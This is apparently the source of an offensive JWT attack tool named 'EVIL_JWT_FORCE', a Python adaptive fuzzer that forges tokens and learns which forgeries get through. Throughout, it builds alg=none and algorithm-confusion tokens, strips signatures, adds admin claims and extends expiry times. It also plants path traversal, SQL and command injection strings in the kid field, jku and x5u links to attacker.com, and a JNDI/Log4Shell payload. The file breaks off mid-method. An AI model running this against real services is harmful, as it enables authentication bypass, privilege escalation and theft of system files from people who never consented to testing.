"""
EVIL_JWT_FORCE - Adaptive Fuzzer Module
This module implements an adaptive fuzzer that intelligently modifies 
JWT tokens and fuzzing strategies based on target responses.
"""

import os
import json
import logging
import re
import random
import base64
import hashlib
import numpy as np
from typing import Dict, List, Any, Optional, Tuple, Set, Union
from datetime import datetime, timedelta
import copy
from collections import Counter, defaultdict
import requests
from urllib.parse import urljoin
from utils.network.connection_manager import ConnectionManager

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler(os.path.join('logs', 'adaptive_fuzzer.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('ADAPTIVE_FUZZER')

class AdaptiveFuzzer:
    """
    Adaptive JWT fuzzer that learns from responses to improve attack vectors.
    
    This class implements various JWT fuzzing strategies and adaptively
    adjusts its approach based on the observed responses from the target.
    """
    
    def __init__(self, config_path: str = 'config/adaptive_fuzzer_config.json'):
        """
        Initialize the Adaptive Fuzzer with configuration settings.
        
        Args:
            config_path: Path to the configuration file
        """
        self.config = self._load_config(config_path)
        self.mutation_strategies = self.config.get('mutation_strategies', {})
        self.header_mutations = self.config.get('header_mutations', {})
        self.payload_mutations = self.config.get('payload_mutations', {})
        self.algorithm_mutations = self.config.get('algorithm_mutations', [])
        self.response_patterns = self.config.get('response_patterns', {})
        self.success_indicators = self.config.get('success_indicators', [])
        self.token_history = []
        self.successful_mutations = {}
        self.learning_data = self._load_learning_data()
        self.strategy_effectiveness = {}
        self.target_vulnerabilities = {}
        self.response_clusters = defaultdict(list)
        self.mutation_embeddings = {}
        self.adaptive_weights = self.config.get('adaptive_weights', {})
        self.context_awareness = self.config.get('context_awareness', True)
        self.reinforcement_learning = self.config.get('reinforcement_learning', {})
        
        # Initialize effectiveness scores from learning data
        self._initialize_effectiveness_scores()
        
        logger.info("Adaptive Fuzzer initialized with %d mutation strategies and adaptive learning enabled", 
                   len(self.mutation_strategies))
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from JSON file or use defaults if file not found."""
        default_config = {
            'mutation_strategies': {
                'alg_none': {
                    'description': 'Set algorithm to "none"',
                    'success_rate': 0.5,
                    'priority': 10
                },
                'alg_manipulation': {
                    'description': 'Try different algorithms',
                    'success_rate': 0.4,
                    'priority': 9
                },
                'signature_bypass': {
                    'description': 'Try to bypass signature verification',
                    'success_rate': 0.3,
                    'priority': 8
                },
                'header_injection': {
                    'description': 'Inject into header parameters',
                    'success_rate': 0.2,
                    'priority': 7
                },
                'payload_injection': {
                    'description': 'Inject into payload claims',
                    'success_rate': 0.4,
                    'priority': 6
                },
                'kid_manipulation': {
                    'description': 'Manipulate the "kid" parameter',
                    'success_rate': 0.3,
                    'priority': 8
                },
                'claim_deletion': {
                    'description': 'Delete security-related claims',
                    'success_rate': 0.3,
                    'priority': 5
                },
                'claim_addition': {
                    'description': 'Add privileged claims',
                    'success_rate': 0.4,
                    'priority': 7
                },
                'timestamp_manipulation': {
                    'description': 'Manipulate timestamp-related claims',
                    'success_rate': 0.5,
                    'priority': 8
                },
                'nested_payload': {
                    'description': 'Create nested objects in payload',
                    'success_rate': 0.3,
                    'priority': 6
                },
                'type_confusion': {
                    'description': 'Change data types of values',
                    'success_rate': 0.4,
                    'priority': 7
                },
                'jwk_injection': {
                    'description': 'Inject malicious JWK data',
                    'success_rate': 0.4,
                    'priority': 8
                },
                'header_parameter_confusion': {
                    'description': 'Add confusing header parameters',
                    'success_rate': 0.3,
                    'priority': 6
                }
            },
            'header_mutations': {
                'alg': ['none', 'None', 'NONE', 'HS256', 'HS384', 'HS512', 'RS256', 'ES256'],
                'typ': ['JWT', 'jwt', None],
                'kid': ['1', '0', '../../../../../dev/null', 'non_existing_key', 'file:///dev/null', 'sql_injection'],
                'jku': ['http://attacker.com/keys.json', 'file:///etc/passwd'],
                'x5u': ['http://attacker.com/cert.pem', 'file:///etc/passwd'],
                'cty': ['text/plain', 'application/json'],
                'enc': ['A128CBC-HS256', 'A256GCM'],
                'jwk': [{'kty': 'oct', 'k': 'AAA'}, {'kty': 'RSA', 'e': 'AQAB', 'n': 'AAA'}]
            },
            'payload_mutations': {
                'admin': [True, 1, 'true', 'yes'],
                'role': ['admin', 'administrator', 'root', 'superuser'],
                'privileges': ['admin', 'all', '*'],
                'isAdmin': [True, 1, 'true', 'yes'],
                'is_admin': [True, 1, 'true', 'yes'],
                'exp': [None, 2524608000, 99999999999],  # Far future timestamps
                'iat': [None, 0, 1],  # Very old issuance time
                'nbf': [None, 0, 1],  # No restrictions on "not before"
                'sub': ['admin', 'root', 'administrator', '1', '0'],
                'permission': ['admin', 'all', '*'],
                'scope': ['admin', 'admin:*', '*'],
                'groups': [['admin'], ['admin', 'user'], '*'],
                'authorities': [['ROLE_ADMIN'], ['ROLE_ADMIN', 'ROLE_USER']],
                'access': [{'admin': True}, {'level': 'all'}],
                'user_type': ['admin', 'internal', 'system'],
                'auth_level': [9, 99, 999, 'max']
            },
            'algorithm_mutations': [
                'none', 'None', 'NONE', '', 
                'HS256', 'HS384', 'HS512', 
                'RS256', 'RS384', 'RS512',
                'ES256', 'ES384', 'ES512',
                'PS256', 'PS384', 'PS512'
            ],
            'response_patterns': {
                'success': [
                    'success', 'authenticated', 'authorized', 'welcome', 
                    'admin', 'dashboard', 'profile', 'logged in'
                ],
                'error': [
                    'error', 'invalid', 'failed', 'unauthorized', 'forbidden',
                    'signature', 'expired', 'token', 'invalid token'
                ],
                'sql_error': [
                    'sql', 'database', 'syntax', 'mysql', 'postgres', 'sqlite'
                ],
                'path_traversal': [
                    'no such file', 'directory', 'not found', 'path', 'cannot open'
                ],
                'internal_error': [
                    'internal server error', 'exception', 'stack trace', 'runtime error'
                ]
            },
            'success_indicators': [
                {'pattern': 'admin.*panel', 'weight': 0.9},
                {'pattern': 'dashboard', 'weight': 0.8},
                {'pattern': 'welcome.*back', 'weight': 0.7},
                {'pattern': 'authenticated.*true', 'weight': 0.9},
                {'pattern': 'authorized.*true', 'weight': 0.9},
                {'pattern': 'success.*true', 'weight': 0.8},
                {'pattern': 'admin.*true', 'weight': 0.9},
                {'pattern': 'user.*profile', 'weight': 0.7},
                {'pattern': 'account.*details', 'weight': 0.7},
                {'pattern': 'permission.*granted', 'weight': 0.8}
            ],
            'adaptive_weights': {
                'success_boost': 1.5,
                'failure_penalty': 0.8,
                'learning_rate': 0.1,
                'context_weight': 1.2,
                'history_weight': 0.9,
                'novelty_bonus': 1.1
            },
            'context_awareness': True,
            'reinforcement_learning': {
                'enabled': True,
                'exploration_rate': 0.2,
                'decay_factor': 0.95,
                'reward_success': 10,
                'reward_partial': 2,
                'reward_failure': -1
            },
            'learning_rate': 0.1,
            'max_history_size': 100,
            'mutation_limit': 50,
            'payload_injection_strings': [
                "' OR 1=1 --",
                "' OR '1'='1",
                "1' OR '1'='1",
                "admin' --",
                "admin'/*",
                "' UNION SELECT 1,2,3 --",
                "${jndi:ldap://attacker.com/a}",
                "{{7*7}}",
                "#{7*7}",
                "${{<%[%'"
            ],
            'semantic_analysis': {
                'enabled': True,
                'similarity_threshold': 0.7,
                'cluster_responses': True
            },
            'advanced_mutations': {
                'enabled': True,
                'combine_strategies': True,
                'max_combinations': 3,
                'mutation_depth': 2
            }
        }
        
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
            else:
                logger.warning("Config file not found at %s. Using default configuration.", config_path)
                # Create default config
                os.makedirs(os.path.dirname(config_path), exist_ok=True)
                with open(config_path, 'w') as f:
                    json.dump(default_config, f, indent=2)
                return default_config
        except Exception as e:
            logger.error("Error loading configuration: %s. Using default configuration.", str(e))
            return default_config
    
    def _load_learning_data(self) -> Dict[str, Any]:
        """Load learning data from file or initialize new if not available."""
        learning_file = os.path.join('data', 'fuzzer_learning.json')
        
        try:
            if os.path.exists(learning_file):
                with open(learning_file, 'r') as f:
                    return json.load(f)
            else:
                logger.info("No previous learning data found. Initializing new learning dataset.")
                learning_data = {
                    'mutation_success_rates': {},
                    'target_vulnerabilities': {},
                    'successful_mutations': {},
                    'response_clusters': {},
                    'strategy_effectiveness': {},
                    'target_characteristics': {},
                    'last_updated': datetime.now().isoformat()
                }
                
                # Initialize with default success rates from config
                for strategy, info in self.mutation_strategies.items():
                    learning_data['mutation_success_rates'][strategy] = {
                        'attempts': 0,
                        'successes': 0,
                        'success_rate': info.get('success_rate', 0.5)
                    }
                
                os.makedirs(os.path.dirname(learning_file), exist_ok=True)
                with open(learning_file, 'w') as f:
                    json.dump(learning_data, f, indent=2)
                return learning_data
        except Exception as e:
            logger.error("Error loading learning data: %s", str(e))
            return {
                'mutation_success_rates': {},
                'target_vulnerabilities': {},
                'successful_mutations': {},
                'response_clusters': {},
                'strategy_effectiveness': {}
            }
    
    def _initialize_effectiveness_scores(self) -> None:
        """Initialize strategy effectiveness scores from learning data."""
        if 'mutation_success_rates' in self.learning_data:
            for strategy, data in self.learning_data['mutation_success_rates'].items():
                if strategy in self.mutation_strategies:
                    # Verificar se data é um dicionário antes de acessar seus valores
                    if isinstance(data, dict):
                        # Calculate success rate if we have attempts
                        if data.get('attempts', 0) > 0:
                            success_rate = data.get('successes', 0) / data.get('attempts', 1)
                        else:
                            success_rate = data.get('success_rate', 0.5)
                    else:
                        # Se data não for um dicionário, usar valor padrão
                        success_rate = self.mutation_strategies[strategy].get('success_rate', 0.5)
                    
                    self.strategy_effectiveness[strategy] = success_rate
    
    def _save_learning_data(self) -> None:
        """Save learning data to file."""
        learning_file = os.path.join('data', 'fuzzer_learning.json')
        
        try:
            # Update timestamp
            self.learning_data['last_updated'] = datetime.now().isoformat()
            
            # Save to file
            os.makedirs(os.path.dirname(learning_file), exist_ok=True)
            with open(learning_file, 'w') as f:
                json.dump(self.learning_data, f, indent=2)
                
            logger.info("Learning data saved successfully")
        except Exception as e:
            logger.error("Error saving learning data: %s", str(e))
    
    def decode_token(self, token: str) -> Dict[str, Any]:
        """
        Decode a JWT token into its components.
        
        Args:
            token: The JWT token to decode
            
        Returns:
            Dictionary containing decoded header, payload, and signature parts
        """
        try:
            if not token or not isinstance(token, str):
                return {'valid': False, 'error': 'Invalid token: empty or not a string'}
            
            parts = token.split('.')
            if len(parts) != 3:
                return {'valid': False, 'error': 'Invalid JWT format'}
            
            header_part, payload_part, signature_part = parts
            
            # Decode header and payload
            def decode_part(part):
                # Add padding
                padding_needed = 4 - (len(part) % 4)
                if padding_needed < 4:
                    part += '=' * padding_needed
                
                # URL-safe base64 decode
                decoded = base64.urlsafe_b64decode(part)
                
                # Parse JSON
                return json.loads(decoded)
            
            try:
                header = decode_part(header_part)
                payload = decode_part(payload_part)
            
                return {
                    'valid': True,
                    'header': header,
                    'payload': payload,
                    'signature': signature_part,
                    'parts': parts
                }
            except Exception as e:
                logger.warning("Error decoding JWT parts: %s", str(e))
                return {'valid': False, 'error': f'Error decoding JWT: {str(e)}'}
                
        except Exception as e:
            logger.error("Error decoding token: %s", str(e))
            return {'valid': False, 'error': str(e)}
    
    def encode_token(self, header: Dict[str, Any], payload: Dict[str, Any], 
                   signature: Optional[str] = None) -> str:
        """
        Encode header and payload into a JWT token.
        
        Args:
            header: The JWT header
            payload: The JWT payload
            signature: Optional signature part (if None, original signature is used)
            
        Returns:
            Encoded JWT token
        """
        try:
            def encode_part(part):
                # Convert to JSON
                part_json = json.dumps(part, separators=(',', ':'))
                
                # URL-safe base64 encode
                encoded = base64.urlsafe_b64encode(part_json.encode()).decode()
                
                # Remove padding
                return encoded.rstrip('=')
            
            # Encode header and payload
            header_encoded = encode_part(header)
            payload_encoded = encode_part(payload)
            
            # Use provided signature or empty for none algorithm
            if signature is None:
                if header.get('alg', '').lower() == 'none':
                    signature = ''
                else:
                    raise ValueError("Signature required for non-'none' algorithm")
            
            # Construct token
            return f"{header_encoded}.{payload_encoded}.{signature}"
            
        except Exception as e:
            logger.error("Error encoding token: %s", str(e))
            raise
    
    def generate_mutations(self, token: str, strategy: Optional[str] = None, 
                         limit: int = 10) -> List[Dict[str, Any]]:
        """
        Generate mutations of a JWT token using various strategies.
        
        Args:
            token: The JWT token to mutate
            strategy: Optional specific strategy to use (if None, all strategies are considered)
            limit: Maximum number of mutations to generate
            
        Returns:
            List of dictionaries containing mutated tokens and metadata
        """
        # Decode the token
        decoded = self.decode_token(token)
        if not decoded.get('valid', False):
            logger.error("Cannot generate mutations for invalid token")
            return []
        
        mutations = []
        
        # If strategy is specified, use only that strategy
        if strategy and strategy in self.mutation_strategies:
            mutation_func = getattr(self, f"_mutate_{strategy}", None)
            if mutation_func:
                mutations.extend(mutation_func(decoded))
        else:
            # Use all strategies, prioritized by effectiveness
            strategies = self.prioritize_strategies()
            
            for strategy_info in strategies:
                strategy_name = strategy_info['strategy']
                mutation_func = getattr(self, f"_mutate_{strategy_name}", None)
                
                if mutation_func:
                    # Generate mutations with this strategy
                    strategy_mutations = mutation_func(decoded)
                    
                    # Add strategy information to each mutation
                    for mutation in strategy_mutations:
                        mutation['strategy'] = strategy_name
                        mutation['priority'] = strategy_info.get('priority', 5)
                        mutation['effectiveness'] = strategy_info.get('effectiveness', 0.5)
                    
                    mutations.extend(strategy_mutations)
                    
                    # Stop if we have enough mutations
                    if len(mutations) >= limit:
                        break
        
        # Apply advanced mutations if enabled
        if self.config.get('advanced_mutations', {}).get('enabled', False) and len(mutations) < limit:
            advanced_mutations = self._generate_advanced_mutations(decoded, mutations, limit - len(mutations))
            mutations.extend(advanced_mutations)
        
        # Limit the number of mutations
        mutations = mutations[:limit]
        
        # Add timestamps and IDs to mutations
        for i, mutation in enumerate(mutations):
            mutation['id'] = f"{datetime.now().strftime('%Y%m%d%H%M%S')}_{i}"
            mutation['timestamp'] = datetime.now().isoformat()
            
            # Generate embedding for this mutation
            self._generate_mutation_embedding(mutation)
        
        logger.info("Generated %d mutations using %s strategies", 
                  len(mutations), "specified" if strategy else "prioritized")
        
        return mutations
    
    def _mutate_alg_none(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Mutate the token to use 'none' algorithm.
        
        Args:
            decoded: Decoded JWT token
            
        Returns:
            List of mutations
        """
        mutations = []
        
        # Get original parts
        header = copy.deepcopy(decoded.get('header', {}))
        payload = copy.deepcopy(decoded.get('payload', {}))
        
        # Try different variations of 'none'
        for alg_value in ['none', 'None', 'NONE', 'nOnE']:
            mutated_header = copy.deepcopy(header)
            mutated_header['alg'] = alg_value
            
            try:
                # Create token with empty signature
                mutated_token = self.encode_token(mutated_header, payload, '')
                
                mutations.append({
                    'token': mutated_token,
                    'description': f"Changed algorithm to '{alg_value}' with empty signature",
                    'modified_parts': ['header', 'signature'],
                    'mutation_type': 'alg_none',
                    'severity': 'high',
                    'details': {
                        'original_alg': header.get('alg', 'unknown'),
                        'mutated_alg': alg_value
                    }
                })
            except Exception as e:
                logger.error(f"Error creating 'none' algorithm mutation: {str(e)}")
        
        # Try removing the algorithm completely
        try:
            mutated_header = copy.deepcopy(header)
            if 'alg' in mutated_header:
                del mutated_header['alg']
            
            mutated_token = self.encode_token(mutated_header, payload, '')
            
            mutations.append({
                'token': mutated_token,
                'description': "Removed 'alg' parameter from header with empty signature",
                'modified_parts': ['header', 'signature'],
                'mutation_type': 'alg_none',
                'severity': 'high',
                'details': {
                    'original_alg': header.get('alg', 'unknown'),
                    'mutated_alg': 'removed'
                }
            })
        except Exception as e:
            logger.error(f"Error creating algorithm removal mutation: {str(e)}")
            
        # Try with empty object as algorithm
        try:
            mutated_header = copy.deepcopy(header)
            mutated_header['alg'] = {}
            
            mutated_token = self.encode_token(mutated_header, payload, '')
            
            mutations.append({
                'token': mutated_token,
                'description': "Set 'alg' parameter to empty object",
                'modified_parts': ['header', 'signature'],
                'mutation_type': 'alg_none',
                'severity': 'high',
                'details': {
                    'original_alg': header.get('alg', 'unknown'),
                    'mutated_alg': '{}'
                }
            })
        except Exception as e:
            logger.error(f"Error creating empty object algorithm mutation: {str(e)}")
        
        return mutations
    
    def _mutate_alg_manipulation(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate algorithm manipulation mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # Try different algorithms
        for alg in self.algorithm_mutations:
            if alg == header.get('alg'):
                continue  # Skip the current algorithm
            
            header_mod = copy.deepcopy(header)
            header_mod['alg'] = alg
            
            # For RS256/ES256 to HS256 confusion attack, keep the signature
            confusion_attack = (header.get('alg', '') in ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'] and 
                             alg in ['HS256', 'HS384', 'HS512'])
            
            if confusion_attack:
                token = self.encode_token(header_mod, payload, signature)
                mutations.append({
                    'token': token,
                    'mutation_type': 'alg_confusion',
                    'header': header_mod,
                    'payload': payload,
                    'confidence': 0.8,
                    'notes': f"Algorithm confusion attack: {header.get('alg', '')} to {alg}"
                })
            else:
                # For other algorithm changes, try with and without signature
                token_no_sig = self.encode_token(header_mod, payload, '')
                mutations.append({
                    'token': token_no_sig,
                    'mutation_type': 'alg_change_no_signature',
                    'header': header_mod,
                    'payload': payload,
                    'confidence': 0.4
                })
                
                token_with_sig = self.encode_token(header_mod, payload, signature)
                mutations.append({
                    'token': token_with_sig,
                    'mutation_type': 'alg_change_with_signature',
                    'header': header_mod,
                    'payload': payload,
                    'confidence': 0.3
                })
        
        return mutations
    
    def _mutate_signature_bypass(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate signature bypass mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        
        # Try with empty signature
        token_empty = self.encode_token(header, payload, '')
        mutations.append({
            'token': token_empty,
            'mutation_type': 'empty_signature',
            'header': header,
            'payload': payload,
            'confidence': 0.4
        })
        
        # Try with modified but invalid signature
        invalid_signatures = ['x', 'invalid', 'AA==', 'ABCDEFG']
        for i, sig in enumerate(invalid_signatures):
            token_invalid = self.encode_token(header, payload, sig)
            mutations.append({
                'token': token_invalid,
                'mutation_type': f'invalid_signature_{i}',
                'header': header,
                'payload': payload,
                'confidence': 0.2
            })
        
        return mutations
    
    def _mutate_header_injection(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate header injection mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # Try different header injections
        for param, values in self.header_mutations.items():
            if param == 'alg':
                continue  # Skip 'alg' as it's handled by alg_manipulation
            
            for value in values:
                header_mod = copy.deepcopy(header)
                header_mod[param] = value
                
                token = self.encode_token(header_mod, payload, signature)
                mutations.append({
                    'token': token,
                    'mutation_type': f'header_injection_{param}',
                    'header': header_mod,
                    'payload': payload,
                    'confidence': 0.5 if param in ['kid', 'jku', 'x5u'] else 0.3,
                    'notes': f"Injected {param}:{value} into header"
                })
        
        # SQL injection in header fields
        for param in ['kid', 'jku', 'x5u', 'cty']:
            if param in header:
                for injection in self.config.get('payload_injection_strings', [])[:3]:
                    header_mod = copy.deepcopy(header)
                    header_mod[param] = injection
                    
                    token = self.encode_token(header_mod, payload, signature)
                    mutations.append({
                        'token': token,
                        'mutation_type': f'header_sqli_{param}',
                        'header': header_mod,
                        'payload': payload,
                        'confidence': 0.4,
                        'notes': f"SQL injection in header parameter {param}"
                    })
        
        return mutations
    
    def _mutate_payload_injection(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate payload injection mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # SQL injection in payload fields
        for field in payload.keys():
            # Skip standard JWT fields for SQL injection
            if field not in ['iat', 'exp', 'nbf']:
                for injection in self.config.get('payload_injection_strings', [])[:3]:
                    payload_mod = copy.deepcopy(payload)
                    payload_mod[field] = injection
                    
                    token = self.encode_token(header, payload_mod, signature)
                    mutations.append({
                        'token': token,
                        'mutation_type': f'payload_sqli_{field}',
                        'header': header,
                        'payload': payload_mod,
                        'confidence': 0.4,
                        'notes': f"SQL injection in payload field {field}"
                    })
        
        # Try privilege escalation in payload
        for field, values in self.payload_mutations.items():
            if field in payload:
                continue  # Skip if already exists
            
            for value in values:
                payload_mod = copy.deepcopy(payload)
                payload_mod[field] = value
                
                token = self.encode_token(header, payload_mod, signature)
                mutations.append({
                    'token': token,
                    'mutation_type': f'payload_addition_{field}',
                    'header': header,
                    'payload': payload_mod,
                    'confidence': 0.6,
                    'notes': f"Added {field}:{value} to payload"
                })
        
        return mutations
    
    def _mutate_kid_manipulation(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate 'kid' parameter manipulation mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # Skip if no 'kid' in header and no 'alg' that would use it
        if 'kid' not in header and not header.get('alg', '').startswith(('HS', 'RS', 'ES')):
            return mutations
        
        # Path traversal in 'kid' parameter
        path_traversals = [
            '../../../../../../../dev/null',
            '../../../../../../../etc/passwd',
            '../../../../../../../windows/win.ini',
            'file:///etc/passwd',
            'file:///dev/null',
            'file:///../../../../../../../etc/passwd'
        ]
        
        for path in path_traversals:
            header_mod = copy.deepcopy(header)
            header_mod['kid'] = path
            
            token = self.encode_token(header_mod, payload, signature)
            mutations.append({
                'token': token,
                'mutation_type': 'kid_path_traversal',
                'header': header_mod,
                'payload': payload,
                'confidence': 0.6,
                'notes': f"Path traversal in kid parameter: {path}"
            })
        
        # SQL injection in 'kid' parameter
        sql_injections = [
            "' OR 1=1 --",
            "' UNION SELECT 1,2,3 --",
            "'; DROP TABLE users; --",
            "' OR '1'='1"
        ]
        
        for injection in sql_injections:
            header_mod = copy.deepcopy(header)
            header_mod['kid'] = injection
            
            token = self.encode_token(header_mod, payload, signature)
            mutations.append({
                'token': token,
                'mutation_type': 'kid_sql_injection',
                'header': header_mod,
                'payload': payload,
                'confidence': 0.5,
                'notes': f"SQL injection in kid parameter: {injection}"
            })
        
        # Command injection in 'kid' parameter
        cmd_injections = [
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "| cat /etc/passwd",
            "& type c:\\windows\\win.ini"
        ]
        
        for injection in cmd_injections:
            header_mod = copy.deepcopy(header)
            header_mod['kid'] = injection
            
            token = self.encode_token(header_mod, payload, signature)
            mutations.append({
                'token': token,
                'mutation_type': 'kid_cmd_injection',
                'header': header_mod,
                'payload': payload,
                'confidence': 0.4,
                'notes': f"Command injection in kid parameter: {injection}"
            })
        
        return mutations
    
    def _mutate_claim_deletion(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate claim deletion mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # Try removing security-related claims
        security_claims = ['exp', 'nbf', 'iat', 'aud', 'iss', 'sub']
        
        for claim in security_claims:
            if claim in payload:
                payload_mod = copy.deepcopy(payload)
                del payload_mod[claim]
                
                token = self.encode_token(header, payload_mod, signature)
                mutations.append({
                    'token': token,
                    'mutation_type': f'claim_deletion_{claim}',
                    'header': header,
                    'payload': payload_mod,
                    'confidence': 0.7 if claim in ['exp', 'nbf'] else 0.4,
                    'notes': f"Removed {claim} claim from payload"
                })
        
        return mutations
    
    def _mutate_claim_addition(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate claim addition mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # Add privileged claims
        privileged_claims = {
            'admin': True,
            'isAdmin': True,
            'is_admin': True,
            'role': 'admin',
            'permissions': ['admin', 'superuser'],
            'scope': 'admin',
            'groups': ['admin', 'superuser']
        }
        
        for claim, value in privileged_claims.items():
            if claim not in payload:
                payload_mod = copy.deepcopy(payload)
                payload_mod[claim] = value
                
                token = self.encode_token(header, payload_mod, signature)
                mutations.append({
                    'token': token,
                    'mutation_type': f'claim_addition_{claim}',
                    'header': header,
                    'payload': payload_mod,
                    'confidence': 0.6,
                    'notes': f"Added privileged claim {claim}:{value}"
                })
        
        return mutations
    
    def _mutate_timestamp_manipulation(self, decoded: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate timestamp manipulation mutations."""
        mutations = []
        
        # Extract parts
        header = copy.deepcopy(decoded['header'])
        payload = copy.deepcopy(decoded['payload'])
        signature = decoded.get('signature', '')
        
        # Manipulate 'exp' claim
        if 'exp' in payload:
            # Far future expiration
            payload_mod = copy.deepcopy(payload)
            payload_mod['exp'] = int((datetime.now() + timedelta(days=3650)).timestamp())  # 10 years in future
            
            token = self.encode_token(header, payload_mod, signature)
            mutations.append({
                'token': token,
                'mutation_type': 'exp_far_future',
                'header': header,
                'payload': payload_mod,
                'confidence': 0.7,
                'notes': "Set expiration to far future (10 years)"
            })
        
        # Manipulate 'nbf' claim
        if 'nbf' in payload:
            # Set 'not before' to past date
            payload_mod = copy.deepcopy(payload)
            payload_mod['nbf'] = int((datetime.now() - timedelta(days=365)).timestamp())  # 1 year in past
            
            token = self.encode_token(header, payload_mod, signature)
            mutations.append({
                'token': token,
                'mutation_type': 'nbf_past',
                'header': header,
                'payload': payload_mod,
                'confidence': 0.6,
                'notes': "Set 'not before' to past date (1 year ago)"
            })
        
        # Manipulate 'iat' claim
        if 'iat' in payload:
            # Set issuance time to far past
            payload_mod = copy.deepcopy(payload)
            payload_mod['iat'] = 0  # January 1, 1970
            
            token = self.encode_token(header, payload_mod, signature)
            mutations.append({
                'token': token,
                'mutation_type': 'iat_epoch',
                'header': header,
                'payload': payload_mod,
                'confidence': 0.5,
                'notes': "Set issuance time to epoch (Jan 1, 1970)"
            })
        
        return mutations
    
    def analyze_response(self, response: Dict[str, Any], mutation_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze a response to determine if a mutation was successful.
        
        Args:
            response: The HTTP response to analyze
            mutation_info: Information about the mutation that was tested
            
        Returns:
            Dictionary with analysis results
        """
        logger.info("Analyzing response for mutation %s", mutation_info.get('mutation_type', 'unknown'))
        
        # Initialize analysis results
        analysis = {
            'mutation_type': mutation_info.get('mutation_type', 'unknown'),
            'strategy': mutation_info.get('strategy', 'unknown'),
            'response_code': response.get('status_code', 0),
            'success': False,
            'confidence': 0.0,
            'indicators': [],
            'token': mutation_info.get('token', ''),
            'timestamp': datetime.now().isoformat()
        }
        
        # Get response body
        response_body = response.get('body', '')
        if not response_body:
            logger.warning("Empty response body")
            return analysis
        
        # Check for success patterns
        for pattern_type, patterns in self.response_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    analysis['indicators'].append({
                        'type': pattern_type,
                        'pattern': pattern,
                        'weight': 0.7 if pattern_type == 'success' else 0.3
                    })
        
        # Check for specific success indicators
        for indicator in self.success_indicators:
            pattern = indicator.get('pattern', '')
            if re.search(pattern, response_body, re.IGNORECASE):
                analysis['indicators'].append({
                    'type': 'success_indicator',
                    'pattern': pattern,
                    'weight': indicator.get('weight', 0.5)
                })
        
        # Calculate success confidence
        if analysis['indicators']:
            # Calculate weighted average of indicator weights
            total_weight = sum(ind.get('weight', 0) for ind in analysis['indicators'])
            weighted_sum = sum(ind.get('weight', 0) ** 2 for ind in analysis['indicators'])
            
            # More indicators means higher confidence
            indicator_count = len(analysis['indicators'])
            indicator_factor = min(1.0, indicator_count / 3)
            
            if total_weight > 0:
                analysis['confidence'] = (weighted_sum / total_weight) * indicator_factor
            
            # Check if there are more success than error indicators
            success_count = sum(1 for ind in analysis['indicators'] if ind.get('type') == 'success' or ind.get('type') == 'success_indicator')
            error_count = sum(1 for ind in analysis['indicators'] if ind.get('type') == 'error')
            
            if success_count > 0 and success_count > error_count:
                analysis['success'] = True
        
        # Additional factors affecting confidence
        if response.get('status_code', 0) in [200, 201, 202, 204]:
            analysis['confidence'] += 0.1
        elif response.get('status_code', 0) in [401, 403, 500]:
            analysis['confidence'] -= 0.1
        
        # Store in token history
        self._add_to_history(mutation_info, response, analysis)
        
        # Update learning data
        if analysis['success']:
            self._update_learning_data(mutation_info, analysis)
        
        return analysis
    
    def _add_to_history(self, mutation_info: Dict[str, Any], response: Dict[str, Any], 
                      analysis: Dict[str, Any]) -> None:
        """Add a mutation attempt to the history."""
        history_entry = {
            'timestamp': datetime.now().isoformat(),
            'mutation_type': mutation_info.get('mutation_type', 'unknown'),
            'strategy': mutation_info.get('strategy', 'unknown'),
            'token': mutation_info.get('token', ''),
            'response_code': response.get('status_code', 0),
            'success': analysis.get('success', False),
            'confidence': analysis.get('confidence', 0.0)
        }
        
        self.token_history.append(history_entry)
        
        # Limit history size
        max_history = self.config.get('max_history_size', 100)
        if len(self.token_history) > max_history:
            self.token_history = self.token_history[-max_history:]
        
        # Store successful mutations
        if analysis.get('success', False):
            strategy = mutation_info.get('strategy', 'unknown')
            
            if strategy not in self.successful_mutations:
                self.successful_mutations[strategy] = []
            
            self.successful_mutations[strategy].append({
                'token': mutation_info.get('token', ''),
                'mutation_type': mutation_info.get('mutation_type', 'unknown'),
                'timestamp': datetime.now().isoformat(),
                'confidence': analysis.get('confidence', 0.0)
            })
    
    def _update_learning_data(self, mutation_info: Dict[str, Any], analysis: Dict[str, Any]) -> None:
        """Update learning data based on successful mutations."""
        strategy = mutation_info.get('strategy', 'unknown')
        mutation_type = mutation_info.get('mutation_type', 'unknown')
        
        # Update success rates for the strategy
